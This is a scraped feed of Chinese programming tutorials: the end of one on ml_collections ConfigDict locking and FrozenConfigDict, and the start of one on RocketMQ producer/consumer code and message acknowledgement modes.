<li>lock后，可以修改已有的字段，包括嵌套里的字段</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

<span class="hljs-comment"># 1. 创建配置并初始化【已有字段】</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
<span class="hljs-comment"># 嵌套配置</span>
cfg.model = ConfigDict()
cfg.model.dropout = <span class="hljs-number">0.2</span>

<span class="hljs-comment"># 2. 核心：执行上锁操作</span>
cfg.lock()

<span class="hljs-comment"># 上锁后 - 修改【已有字段】：正常生效，无报错 </span>
cfg.lr = <span class="hljs-number">0.0005</span>          <span class="hljs-comment"># 修改根层级已有字段 ✔️</span>
cfg.batch_size = <span class="hljs-number">64</span>      <span class="hljs-comment"># 修改根层级已有字段 ✔️</span>
cfg.model.dropout = <span class="hljs-number">0.1</span>  <span class="hljs-comment"># 修改嵌套层级已有字段 ✔️</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"修改后的值："</span>, cfg.lr, cfg.batch_size, cfg.model.dropout)

<span class="hljs-comment">#  特性2：上锁后 - 新增【任何字段】：直接报错</span>
<span class="hljs-keyword">try</span>:
    cfg.epochs = <span class="hljs-number">200</span>     <span class="hljs-comment"># 新增根层级字段 </span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 新增根字段报错："</span>, e)

<span class="hljs-keyword">try</span>:
    cfg.model.backbone = <span class="hljs-string">"resnet18"</span>  <span class="hljs-comment"># 新增嵌套层级字段 ❌</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 新增嵌套字段报错："</span>, e)

<span class="hljs-comment"># 特性3：上锁后 - 删除【任何字段】：直接报错 </span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> cfg.lr  <span class="hljs-comment"># 删除根层级已有字段 ❌</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 删除根字段报错："</span>, e)

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> cfg.model.dropout  <span class="hljs-comment"># 删除嵌套层级已有字段 ❌</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 删除嵌套字段报错："</span>, e)
</code></pre>
<ul>
<li>判断是否上锁</li>
</ul>
<pre><code class="hljs language-vbscript" lang="vbscript">pr<span class="hljs-built_in">int</span>(cfg.is_locked) # 上锁后返回 <span class="hljs-literal">True</span>，解锁后返回 <span class="hljs-literal">False</span>
</code></pre>
<ul>
<li>彻底解锁</li>
</ul>
<pre><code class="hljs language-scss" lang="scss">cfg<span class="hljs-selector-class">.unlock</span>()
</code></pre>
<ul>
<li>临时解锁</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

<span class="hljs-comment"># 1. 创建配置 + 赋值已有字段</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
cfg.model = ConfigDict()

<span class="hljs-comment"># 2. 上锁（核心前提）</span>
cfg.lock()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"初始上锁状态: <span class="hljs-subst">{cfg.is_locked}</span>"</span>)  <span class="hljs-comment"># True</span>

<span class="hljs-comment"># 临时解锁 with cfg.unlocked()</span>
<span class="hljs-comment"># 特性：代码块内 临时解锁，可自由 新增/修改/删除 任何字段；代码块结束 自动重新上锁，无需手动操作</span>
<span class="hljs-keyword">with</span> cfg.unlocked():
    <span class="hljs-comment"># ✅ 临时修改已有字段</span>
    cfg.lr = <span class="hljs-number">0.0005</span>
    cfg.model.dropout = <span class="hljs-number">0.1</span>
    <span class="hljs-comment"># ✅ 临时新增字段（根+嵌套都可以）</span>
    cfg.epochs = <span class="hljs-number">200</span>
    cfg.model.backbone = <span class="hljs-string">"resnet18"</span>
    <span class="hljs-comment"># ✅ 临时删除字段</span>
    <span class="hljs-keyword">del</span> cfg.batch_size

<span class="hljs-comment"># 验证：代码块结束后自动上锁 + 操作全部生效</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"临时解锁后状态: <span class="hljs-subst">{cfg.is_locked}</span>"</span>)  <span class="hljs-comment"># True 自动上锁</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"修改后: <span class="hljs-subst">{cfg.lr}</span>, <span class="hljs-subst">{cfg.model.dropout}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"新增后: <span class="hljs-subst">{cfg.epochs}</span>, <span class="hljs-subst">{cfg.model.backbone}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"删除后batch_size是否存在: <span class="hljs-subst">{<span class="hljs-string">'batch_size'</span> <span class="hljs-keyword">in</span> cfg}</span>"</span>)  <span class="hljs-comment"># False</span>

<span class="hljs-comment"># 上锁状态下 依旧禁止新增/删除（安全兜底）</span>
<span class="hljs-keyword">try</span>:
    cfg.device = <span class="hljs-string">"cuda"</span>
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n上锁禁止新增: <span class="hljs-subst">{e.args[<span class="hljs-number">0</span>]}</span>"</span>)
</code></pre>
<h3 data-id="heading-10">2. 方式2: FrozenConfigDict()</h3>
<ul>
<li>创建，特性：禁止修改、删除、新增</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 正确导入</span>
<span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict
<span class="hljs-keyword">from</span> ml_collections.config_dict <span class="hljs-keyword">import</span> FrozenConfigDict

<span class="hljs-comment"># ✔️ 方式1：ConfigDict 转 FrozenConfigDict</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
<span class="hljs-comment"># 嵌套ConfigDict 正确写法</span>
cfg.model = ConfigDict()
cfg.model.dropout = <span class="hljs-number">0.2</span>
cfg.model.backbone = <span class="hljs-string">"resnet18"</span>

f_cfg = FrozenConfigDict(cfg)

<span class="hljs-comment"># ✔️ 方式2：直接创建 FrozenConfigDict (传字典)</span>
f_cfg2 = FrozenConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>})

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">20</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"FrozenConfigDict只读配置："</span>, f_cfg)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"是否为冰封配置："</span>, <span class="hljs-built_in">isinstance</span>(f_cfg, FrozenConfigDict)) <span class="hljs-comment"># True</span>

<span class="hljs-comment"># 所有【写操作】全部禁止</span>
<span class="hljs-comment"># 1. ❌ 禁止修改已有字段</span>
<span class="hljs-keyword">try</span>:
    f_cfg.lr = <span class="hljs-number">0.0005</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n❌ 修改报错: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 2. ❌ 禁止新增字段</span>
<span class="hljs-keyword">try</span>:
    f_cfg.epochs = <span class="hljs-number">200</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 新增报错: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 3. ❌ 禁止删除字段</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> f_cfg.batch_size
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 删除报错: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 4. ❌ 无lock/unlock方法，天生只读，无需上锁</span>
<span class="hljs-keyword">try</span>:
    f_cfg.lock()
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 无lock方法: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-comment"># 唯一支持的操作：【读取】 </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">20</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 读取基础字段："</span>, f_cfg.lr)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 读取嵌套字段："</span>, f_cfg.model.dropout)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 字典方式读取："</span>, f_cfg[<span class="hljs-string">"batch_size"</span>])
</code></pre>
<ul>
<li>FrozenConfigDict与ConfigDict转换</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 正确导入</span>
from ml_collections import ConfigDict
from ml_collections.config_dict import FrozenConfigDict

<span class="hljs-comment"># ✔️ 转换1: ConfigDict → FrozenConfigDict (冻结，可变→不可变)</span>
<span class="hljs-attr">cfg</span> = ConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>})
<span class="hljs-attr">frozen_cfg</span> = FrozenConfigDict(cfg)

<span class="hljs-comment"># ✔️ 转换2: FrozenConfigDict → ConfigDict (解冻，不可变→可变，恢复所有权限)</span>
<span class="hljs-attr">unfrozen_cfg</span> = ConfigDict(frozen_cfg)

<span class="hljs-comment"># 解冻后 ✅ 恢复全部操作权限：增/删/改 都可以</span>
<span class="hljs-attr">unfrozen_cfg.lr</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>        <span class="hljs-comment"># 修改 ✔️</span>
<span class="hljs-attr">unfrozen_cfg.device</span> = <span class="hljs-string">"cuda"</span>  <span class="hljs-comment"># 新增 ✔️</span>
del unfrozen_cfg.batch_size   <span class="hljs-comment"># 删除 ✔️</span>
print("✅ 解冻后ConfigDict：", unfrozen_cfg)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RocketMQ从实战到源码：客户端消息机制（万字篇幅）]]></title>    <link>https://juejin.cn/post/7597283981185122356</link>    <guid>https://juejin.cn/post/7597283981185122356</guid>    <pubDate>2026-01-20T14:12:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185122356" data-draft-id="7597243334177374248" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RocketMQ从实战到源码：客户端消息机制（万字篇幅）"/> <meta itemprop="keywords" content="后端,RocketMQ,面试"/> <meta itemprop="datePublished" content="2026-01-20T14:12:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怒放吧德德"/> <meta itemprop="url" content="https://juejin.cn/user/2502950820787672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RocketMQ从实战到源码：客户端消息机制（万字篇幅）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2502950820787672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怒放吧德德
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:12:51.000Z" title="Tue Jan 20 2026 14:12:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读29分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RocketMQ从实战到源码：客户端消息机制</h2>
<blockquote>
<p>😄生命不息，写作不止</p>
<p>🔥 继续踏上学习之路，学之分享笔记</p>
<p>👊 总有一天我也能像各位大佬一样</p>
<p>🏆 <a href="https://juejin.cn/user/2502950820787672" target="_blank" title="https://juejin.cn/user/2502950820787672">博客首页</a>   <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Flyd-code%2F" target="_blank" title="https://www.cnblogs.com/lyd-code/" ref="nofollow noopener noreferrer">@怒放吧德德</a>  <a href="https://link.juejin.cn?target=https%3A%2F%2Flydandtry.github.io%2F" target="_blank" title="https://lydandtry.github.io/" ref="nofollow noopener noreferrer">To记录领地</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_43843951%3Ftype%3Dblog" target="_blank" title="https://blog.csdn.net/qq_43843951?type=blog" ref="nofollow noopener noreferrer">@一个有梦有戏的人</a></p>
<p>🌝分享学习心得，欢迎指正，大家一起学习成长！</p>
</blockquote>
<p><em>转发请携带作者信息</em>  <strong>@怒放吧德德(掘金) @一个有梦有戏的人(CSDN)</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c33ed4ee428469db4621f0d3f673b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=ZyU9aRoqKl3hAsUfbYsLVPSurBU%3D" alt="rocketmq封面.png" loading="lazy"/></p>
<h3 data-id="heading-1">前言</h3>
<p>前面一篇文章，我们简单学习了 RockerMQ 的安装以及简单 demo，现在我们就进一步学习 RockerMQ 的消息机制。本篇篇幅较大，内容较多，后续会将每个消息机制进行抽取。</p>
<h3 data-id="heading-2">1 基础使用</h3>
<p>通过 rocket 的代码中的 example 案例，里面有简单的例子。（包：org.apache.rocketmq.example.quickstart）</p>
<p>生产者代码：</p>
<pre><code class="hljs language-shell" lang="shell">public class Producer {

    /**
     * The number of produced messages.
     */
    public static final int MESSAGE_COUNT = 1000;
    public static final String PRODUCER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";
    public static final String TAG = "TagA";

    public static void main(String[] args) throws MQClientException, InterruptedException {

        // 创建生产者，指定生产组
        DefaultMQProducer producer = new DefaultMQProducer(PRODUCER_GROUP);

        // 设置Nameserver地址
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // 启动生产者
        producer.start();

        for (int i = 0; i &lt; MESSAGE_COUNT; i++) {
            try {
                // 创建消息体：订阅主题、Tag、消息体
                Message msg = new Message(TOPIC,
                        TAG,
                        ("Hello RocketMQ " + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );

                // 发送消息
                SendResult sendResult = producer.send(msg, 20 * 1000);
                System.out.printf("%s%n", sendResult);
            } catch (Exception e) {
                e.printStackTrace();
                Thread.sleep(1000);
            }
        }
        // 关闭生产者，释放资源
        producer.shutdown();
    }
}
</code></pre>
<p>消费这代码：</p>
<pre><code class="hljs language-shell" lang="shell">public class Consumer {

    public static final String CONSUMER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";

    public static void main(String[] args) throws MQClientException {

        // 创建消费者，指定消费组
        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);

        // 设置Nameserver地址
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // 如果特定的消费群体是全新的，请指定从哪里开始
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);

        // 配置订阅主题Topic、Tag
        consumer.subscribe(TOPIC, "*");

        // 设置回调函数，处理消息
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf("%s Receive New Messages: %s %n", Thread.currentThread().getName(), msg);
            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });

        // 启动消费者，启动后会一直挂着，持续处理消息
        consumer.start();

        System.out.printf("Consumer Started.%n");
    }
}
</code></pre>
<p>客户端编程逻辑顺序比较固定。</p>
<p>① 生产者固定步骤</p>
<ul>
<li>创建生产者，指定生产组</li>
<li>设置Nameserver地址</li>
<li>启动生产者</li>
<li>创建消息体：订阅主题、Tag、消息体</li>
<li>发送消息</li>
<li>关闭生产者，释放资源</li>
</ul>
<p>② 消费者固定步骤</p>
<ul>
<li>创建消费者，指定消费组</li>
<li>设置Nameserver地址</li>
<li>如果特定的消费群体是全新的，请指定从哪里开始</li>
<li>配置订阅主题Topic、Tag</li>
<li>设置回调函数，处理消息</li>
<li>启动消费者，启动后会一直挂着，持续处理消息</li>
</ul>
<h3 data-id="heading-3">2 确认消息机制</h3>
<p>消息是必先要保证安全性，而这包含了两种，一是要确保消息发送到 Broker 上，二是要确保消费者能够正常从 Broker 消费。RocketMQ 提供了完善的消息确认机制，确保消息的可靠传递。主要分为生产者发送确认和消费者消费确认两大部分。</p>
<h4 data-id="heading-4">2.1 生产者端</h4>
<p>生产者通过多次重试的机制保证消息正常发送到 Broker。生产者发送消息后，需要确认 Broker 是否成功接收并持久化消息，核心依赖 Broker 的响应结果，不同发送模式的确认方式不同。消息生产者的 3 种消息发送方法：同步发送、异步发送、单向发送（3 种简单代码上文均有提及）。</p>
<h5 data-id="heading-5">2.1.1 发送模式与确认逻辑</h5>

























<table><thead><tr><th align="center">方式</th><th>确认方式</th><th>场景</th></tr></thead><tbody><tr><td align="center">同步发送</td><td>生产者阻塞等待 Broker 返回<code>SendResult</code>，通过<code>SendStatus.SEND_OK</code>判断是否成功</td><td>核心业务（如交易、支付），必须确保消息投递成功</td></tr><tr><td align="center">异步发送</td><td>通过<code>SendCallback</code>回调函数接收结果：<code>onSuccess</code>表示成功，<code>onException</code>表示失败</td><td>高并发场景，无需阻塞等待结果</td></tr><tr><td align="center">单向发送</td><td>只发送消息，不等待 Broker 响应，无确认机制</td><td>非核心业务（如日志采集），允许少量丢失</td></tr></tbody></table>
<p>Broker 端的刷盘 / 复制策略会影响确认的可靠性：</p>
<ul>
<li><strong>刷盘策略</strong>：同步刷盘（消息写入后立即刷磁盘，确认慢但可靠）、异步刷盘（默认，写入内存后立即返回确认，性能高）；</li>
<li><strong>主从复制</strong>：同步复制（主 Broker 需等待从 Broker 同步完成再确认）、异步复制（默认，主 Broker 写入后直接确认）。</li>
</ul>
<h5 data-id="heading-6">2.1.2 单向发送</h5>
<p>单向发送的情况下，生产者只管往 Broker 发送消息，并不关心 Broker 端是否有接收到。</p>
<pre><code class="hljs language-shell" lang="shell">// 单向发送（无确认）
producer.sendOneway(message);
</code></pre>
<p><code>sendOneway</code>方式发送消息有个好处就是效率高，但是如果 Broker 没收到的时候是无法补救的，适用日志采集这种形式。</p>
<h5 data-id="heading-7">2.1.3 同步发送</h5>
<p>同步发送之后会阻塞当前线程，等待 Broker 响应，直到得到响应，开发可以通过获取的结果去做其他处理，如果发送失败可以进行补救，比如重发或者告警之类。</p>
<pre><code class="hljs language-shell" lang="shell">// 同步发送（有确认）
SendResult sendResult = producer.send(message);
System.out.println("发送状态：" + sendResult.getSendStatus()); // SEND_OK
</code></pre>
<p>SendResult 是 Broker 返回的信息，可以查看状态是否成功。里面有 <code>SendStatus</code>，用来表示发送状态。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">SendStatus</span> {
    SEND_OK,
    FLUSH_DISK_TIMEOUT,
    FLUSH_SLAVE_TIMEOUT,
    SLAVE_NOT_AVAILABLE;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">SendStatus</span><span class="hljs-params">()</span> {
    }
}
</code></pre>
<p>这个枚举的说明如下：</p>
<ul>
<li><strong>SEND_OK</strong>: 发送成功，消息已持久化到Broker</li>
<li><strong>FLUSH_DISK_TIMEOUT</strong>: 刷盘超时（同步刷盘模式）</li>
<li><strong>FLUSH_SLAVE_TIMEOUT</strong>: 同步到Slave超时（主从模式）</li>
<li><strong>SLAVE_NOT_AVAILABLE</strong>: Slave不可用</li>
</ul>
<blockquote>
<p>但是此时要注意，如果Broker端返回的SendStatus不是SEND_OK，也并不表示消息就⼀定不会推送给下游的消费者。仅仅只是表示Broker端并没有完全正确的处理这些消息。因此，如果要重新发送消息，最好要带上唯⼀的系统标识，这样在消费者端，才能⾃⾏做幂等判断。也就是⽤具有业务含义的OrderID这样的字段来判断消息有没有被重复处理。</p>
</blockquote>
<p>同步的可能会导致发送耗时比较长，影响后续逻辑。</p>
<h5 data-id="heading-8">2.1.4 异步发送</h5>
<p>异步发送机制下，⽣产者在向Broker发送消息时，会同时注册⼀个回调函数。接下来⽣产者并不等待Broker的响应。当Broker端有响应数据过来时，⾃动触发回调函数进⾏对应的处理。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//  异步发送（回调确认）</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SendCallback</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(SendResult sendResult)</span> {
        <span class="hljs-comment">// 发送成功回调</span>
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onException</span><span class="hljs-params">(Throwable e)</span> {
        <span class="hljs-comment">// 发送失败回调</span>
    }
});
</code></pre>
<p>这个回调函数是用来处理成功与失败的逻辑，如果失败了，就会执行 <code>onException</code>代码逻辑，可以在这里定义对应的补救措施。</p>
<blockquote>
<p>注：触发了SendCallback的onException⽅法同样并不⼀定就表示消息不会向消费者推</p>
<p>送。如果Broker端返回响应信息太慢，超过了超时时间，也会触发 <strong>onException</strong> 方法。</p>
<p>超时默认是 3 秒，通过 <strong>producer.setSendMsgTimeout</strong> 可以修改。</p>
</blockquote>
